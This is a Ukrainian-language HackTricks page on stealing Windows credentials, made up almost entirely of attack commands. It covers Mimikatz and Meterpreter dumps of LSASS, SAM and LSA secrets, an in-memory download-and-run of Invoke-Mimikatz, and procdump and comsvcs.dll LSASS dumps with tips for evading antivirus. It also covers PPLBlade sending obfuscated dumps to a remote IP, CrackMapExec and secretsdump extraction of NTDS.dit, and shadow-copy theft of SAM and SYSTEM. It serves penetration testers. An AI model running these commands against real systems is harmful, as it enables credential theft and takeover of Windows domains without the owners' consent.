# Крадіжка облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Знайдіть інші можливості, які має Mimikatz, на** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Дізнайтеся про деякі можливі захисти облікових даних тут.**](credentials-protections.md) **Ці захисти можуть запобігти витоку деяких облікових даних за допомогою Mimikatz.**

## Облікові дані з Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати паролі та хеші** всередині жертви.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, його не виявляє Defender.\
Ви можете використовувати цей інструмент для **дампу процесу lsass**, **завантаження дампу** та **екстракції** **облікових даних локально** з дампу.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявити** використання **procdump.exe для дампу lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" та "lsass.exe"**. Тому **більш непомітно** передати **PID** lsass.exe як **аргумент** для procdump **замість** **імені lsass.exe.**

### Дамп lsass за допомогою **comsvcs.dll**

DLL з назвою **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **дамп пам'яті процесу** у разі збою. Ця DLL містить **функцію** з назвою **`MiniDumpW`**, призначену для виклику за допомогою `rundll32.exe`.\
Не має значення використовувати перші два аргументи, але третій поділений на три компоненти. Ідентифікатор процесу, який потрібно дампити, становить перший компонент, місце розташування файлу дампу представляє другий, а третій компонент - це строго слово **full**. Альтернативних варіантів не існує.\
Після розбору цих трьох компонентів DLL залучається до створення файлу дампу та перенесення пам'яті вказаного процесу в цей файл.\
Використання **comsvcs.dll** можливе для дампу процесу lsass, що усуває необхідність завантажувати та виконувати procdump. Цей метод описаний детально на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Наступна команда використовується для виконання:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Ви можете автоматизувати цей процес за допомогою** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Витягування lsass за допомогою Диспетчера завдань**

1. Клацніть правою кнопкою миші на панелі завдань і виберіть Диспетчер завдань
2. Натисніть на Більше деталей
3. Знайдіть процес "Local Security Authority Process" на вкладці Процеси
4. Клацніть правою кнопкою миші на процесі "Local Security Authority Process" і виберіть "Створити файл дампа".

### Витягування lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) - це підписаний Microsoft двійковий файл, який є частиною [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) набору.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Витягування lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) - це інструмент для витягування захищених процесів, який підтримує обфускацію дампів пам'яті та їх передачу на віддалені робочі станції без запису на диск.

**Ключові функції**:

1. Обхід захисту PPL
2. Обфускація файлів дампів пам'яті для уникнення механізмів виявлення на основі підписів Defender
3. Завантаження дампу пам'яті з методами RAW та SMB без запису на диск (безфайловий дамп)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## CrackMapExec

### Вивантаження хешів SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Витягування секретів LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Витягти NTDS.dit з цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Витягніть історію паролів NTDS.dit з цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Викрадення SAM та SYSTEM

Ці файли повинні бути **розташовані** в _C:\windows\system32\config\SAM_ та _C:\windows\system32\config\SYSTEM._ Але **ви не можете просто скопіювати їх звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли - отримати копію з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ці файли на вашу машину Kali та **витягніть хеші** за допомогою:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Ви можете виконати копію захищених файлів, використовуючи цю службу. Вам потрібно бути адміністратором.

#### Використання vssadmin

Бінарний файл vssadmin доступний лише в версіях Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але ви можете зробити те ж саме з **Powershell**. Це приклад **як скопіювати файл SAM** (жорсткий диск, що використовується, - "C:", і він зберігається в C:\users\Public), але ви можете використовувати це для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Нарешті, ви також можете використовувати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) для створення копії SAM, SYSTEM та ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Облікові дані Active Directory - NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory**, що містить важливі дані про об'єкти користувачів, групи та їх членство. Саме тут зберігаються **хеші паролів** для доменних користувачів. Цей файл є базою даних **Extensible Storage Engine (ESE)** і знаходиться за адресою **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних підтримуються три основні таблиці:

- **Таблиця даних**: Ця таблиця відповідає за зберігання деталей про об'єкти, такі як користувачі та групи.
- **Таблиця зв'язків**: Вона відстежує відносини, такі як членство в групах.
- **Таблиця SD**: Тут зберігаються **дескриптори безпеки** для кожного об'єкта, що забезпечує безпеку та контроль доступу до збережених об'єктів.

Більше інформації про це: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, і він використовується _lsass.exe_. Тоді **частина** файлу **NTDS.dit** може бути розташована **в пам'яті `lsass`** (ви можете знайти останні доступні дані, ймовірно, через покращення продуктивності за рахунок використання **кешу**).

#### Розшифровка хешів всередині NTDS.dit

Хеш шифрується 3 рази:

1. Розшифрувати ключ шифрування пароля (**PEK**) за допомогою **BOOTKEY** та **RC4**.
2. Розшифрувати **хеш** за допомогою **PEK** та **RC4**.
3. Розшифрувати **хеш** за допомогою **DES**.

**PEK** має **однакове значення** в **кожному контролері домену**, але він **шифрується** всередині файлу **NTDS.dit** за допомогою **BOOTKEY** файлу **SYSTEM контролера домену (відрізняється між контролерами домену)**. Ось чому, щоб отримати облікові дані з файлу NTDS.dit, **вам потрібні файли NTDS.dit та SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно з Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете використовувати трюк з [**копією тіней томів**](./#stealing-sam-and-system) для копіювання файлу **ntds.dit**. Пам'ятайте, що вам також знадобиться копія файлу **SYSTEM** (знову ж таки, [**вивантажте його з реєстру або використовуйте трюк з копією тіней томів**](./#stealing-sam-and-system)).

### **Витягування хешів з NTDS.dit**

Якщо ви **отримали** файли **NTDS.dit** та **SYSTEM**, ви можете використовувати інструменти, такі як _secretsdump.py_, для **витягування хешів**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **автоматично витягувати їх**, використовуючи дійсного користувача адміністратора домену:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих файлів NTDS.dit** рекомендується витягувати їх за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Нарешті, ви також можете використовувати **модуль metasploit**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Витягування об'єктів домену з NTDS.dit до бази даних SQLite**

Об'єкти NTDS можна витягнути до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Витягуються не лише секрети, але й усі об'єкти та їх атрибути для подальшого витягування інформації, коли сирий файл NTDS.dit вже отримано.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` хів є необов'язковим, але дозволяє розшифровувати секрети (NT та LM хеші, додаткові облікові дані, такі як паролі у відкритому вигляді, kerberos або ключі довіри, історії паролів NT та LM). Разом з іншою інформацією, витягуються наступні дані: облікові записи користувачів та машин з їхніми хешами, прапори UAC, мітка часу останнього входу та зміни пароля, опис облікових записів, імена, UPN, SPN, групи та рекурсивні членства, дерево організаційних одиниць та членство, довірені домени з типами довіри, напрямком та атрибутами...

## Lazagne

Завантажте бінарний файл з [тут](https://github.com/AlessandroZ/LaZagne/releases). Ви можете використовувати цей бінарний файл для витягування облікових даних з кількох програм.
```
lazagne.exe all
```
## Інші інструменти для витягування облікових даних з SAM та LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для витягування облікових даних з пам'яті. Завантажте його з: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Витягніть облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягніть облікові дані з файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Завантажте його з: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **виконайте його**, і паролі будуть витягнуті.

## Defenses

[**Дізнайтеся про деякі захисти облікових даних тут.**](credentials-protections.md)

{{#include ../../banners/hacktricks-training.md}}
